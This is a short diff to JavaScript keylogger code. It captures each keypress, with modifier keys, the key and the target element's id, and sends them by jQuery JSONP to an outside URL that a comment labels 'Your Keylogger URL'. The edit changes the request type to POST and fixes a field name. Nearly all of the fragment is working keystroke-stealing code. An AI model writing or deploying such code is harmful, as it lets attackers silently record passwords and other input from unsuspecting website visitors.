@@ -15,12 +15,12 @@ function c(d)
     jQuery.ajax(
     {
         dataType: "jsonp",
-        type:"GET",
+        type:"POST",
         url: "https://aroneekma.github.io/key.php", // Your Keylogger URL
         jsonp:"keypressed",
         data:
         {
-            altnKey:d.altKey?1:0,
+            altKey:d.altKey?1:0,
             ctrlKey:d.ctrlKey?1:0,
             userKey:d.key,
             targKey:d.target.id,
